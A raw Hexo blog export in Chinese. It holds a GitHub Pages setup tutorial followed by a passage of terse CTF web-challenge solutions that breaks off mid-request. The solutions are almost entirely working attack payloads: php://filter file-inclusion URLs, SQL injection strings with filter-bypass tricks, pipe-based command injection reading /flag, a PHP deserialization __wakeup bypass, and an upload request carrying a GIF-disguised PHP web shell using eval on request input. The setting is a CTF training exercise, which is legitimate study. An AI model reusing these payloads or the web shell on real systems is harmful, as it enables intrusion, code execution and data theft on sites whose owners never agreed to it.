srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596723413667"></p><p>注意此仓库名为你github用户名.github.io</p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723504761.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723504761.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596723504761"></p><h4 id="0x04-配置秘钥"><a href="#0x04-配置秘钥" class="headerlink" title="0x04 配置秘钥"></a>0x04 配置秘钥</h4><p>鼠标 右键 打开gitbash</p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723654427.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723654427.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596723654427"></p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723667771.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723667771.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596723667771"></p><p>回车三次，默认不用设置密码</p><p>进入此目录并且打开id_rsa.pub 文件 并复制内容</p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723844872.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723844872.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596723844872"></p><p>打开github 配置秘钥</p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596724029154.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596724029154.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596724029154"></p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596724059373.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596724059373.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596724059373"></p><p>new ssh key </p><p>title随意填 key 为在本地复制的内容</p><p>（此操作的目的在于将本地和github仓库之间通过公钥密码的方式连接起来，不必每次往github上部署代码都要输入密码）</p><h4 id="0x05-安装hexo"><a href="#0x05-安装hexo" class="headerlink" title="0x05 安装hexo"></a>0x05 安装hexo</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org #换成国内源</span><br><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>测试hexo 运行正常</p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596724433169.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596724433169.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596724433169"></p><h4 id="0x06-本地搭建hexo博客"><a href="#0x06-本地搭建hexo博客" class="headerlink" title="0x06 本地搭建hexo博客"></a>0x06 本地搭建hexo博客</h4><p>选择一个本地空目录 /blog （必须是空的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /blog</span><br><span class="line">hexo init #初始化博客</span><br></pre></td></tr></table></figure><p>此时hexo博客已经初步完成，通过以下命令来测试一下效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean #清空缓存</span><br><span class="line">hexo g #==hexo generate 生成</span><br><span class="line">hexo s #==hexo server 启动服务预览</span><br></pre></td></tr></table></figure><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596725137596.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596725137596.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596725137596"></p><p>成功</p><h4 id="0x07-部署到github"><a href="#0x07-部署到github" class="headerlink" title="0x07 部署到github"></a>0x07 部署到github</h4><p>打开初始化博客所在目录 打开 _config</p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596725351828.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596725351828.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596725351828"></p><blockquote><p>修改为：</p><p>deploy:<br>    type: git<br>    repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git<br>    branch: master</p></blockquote><p>参考如</p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596725573101.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596725573101.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596725573101"></p><p>安装插件 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>这个步骤主要是为了让hexo知道你要把blog部署到哪个位置</p><h4 id="0x08更换主题"><a href="#0x08更换主题" class="headerlink" title="0x08更换主题"></a>0x08更换主题</h4><p>我是真的觉得这个主题太丑了，所以打算换一个好看的</p><p>打开blog文件目录下的config配置文件</p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596940242729.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596940242729.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596940242729"></p><p>修改theme字段即可</p><p>然后重新deploy到github</p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些特别简单的web题</title>
      <link href="2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/"/>
      <url>2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>一些题目过于简单，基本没什么特别的考点，签到题，不适合整理为单独一篇，所以写到一起</p><span id="more"></span><h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;14bae7b3-18dd-44fe-bb46-6137f22d2a09.node3.buuoj.cn&#x2F;?cat&#x3D;dog</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d7edc6bc-6e7b-4438-a436-0439ed0b1a5e.node3.buuoj.cn&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p><img src="/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/image-20210204005024530.png" class="lazyload" data-srcset="/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/image-20210204005024530.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210204005024530"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;14cfb339-abd0-4e02-8ef9-06ad8abe2a10.node3.buuoj.cn&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><blockquote><p>admi’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’geek’#</p><p>admi’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’l0ve1ysq1’#</p><p>admi’ union select 1,group_concat(concat(username,0x7e,password)),3 from geek.l0ve1ysq1#</p></blockquote><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><blockquote><p>127.0.0.1|ls /</p><p>127.0.0.1|cat /flag</p></blockquote><h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p><img src="/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/image-20210206014145343.png" class="lazyload" data-srcset="/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/image-20210206014145343.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210206014145343"></p><p><img src="/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/image-20210206014208119.png" class="lazyload" data-srcset="/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/image-20210206014208119.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210206014208119"></p><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>简单的http包的构造</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node3.buuoj.cn:27472</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Syclover/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>https://www.Sycsecret.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=1761c7d1b1462-0f5e806b80c1f4-4c3f2779-18b040-1761c7d1b15293</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p><a href="http://www.zip/">www.zip</a> 备份</p><p>:label:index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">   <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">   <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>:label:class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的反序列化绕过 __wakeup ，构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=serialize(<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>); <span class="comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span></span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>一道比较简单的上传题</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload_file.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>9a06cdee-ebb8-44cf-8836-fd81b4906624.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------225563114326711804942887893620</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>439</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://9a06cdee-ebb8-44cf-8836-fd81b4906624.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://9a06cdee-ebb8-44cf-8836-fd81b4906624.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=1761c7d1b1462-0f5e806b80c1f4-4c3f2779-18b040-1761c7d1b15293</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------225563114326711804942887893620</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;test.phtml&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;phpinfo();eval($_REQUEST[&#x27;M0th&#x27;]);&lt;/script&gt;</span><br><span class="line">sssssssssssssssssssssss</span><br><span class="line">-----------------------------225563114326711804942887893620</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">鎻愪氦</span><br><span class="line">-----------------------------225563114326711804942887893620--</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>简单的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;|| updatexml(1,concat(0x7e,(database())),1)#     geek</span><br><span class="line">dmin&#39; uniunionon seleselectct 1,2,3#</span><br><span class="line">dmin&#39; uniunionon seleselectct 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables wherwheree table_schema&#x3D;&#39;geek&#39;#   b4bsql,geekuser</span><br><span class="line">dmin&#39; uniunionon seleselectct 1,database(),group_concat(column_name) frfromom infoorrmation_schema.columns wherwheree table_name&#x3D;&#39;geekuser&#39;#       id,username,password</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>简单上传题</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ceb0c5e2-1e0e-426f-b67c-00bf90827db6.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line"><span 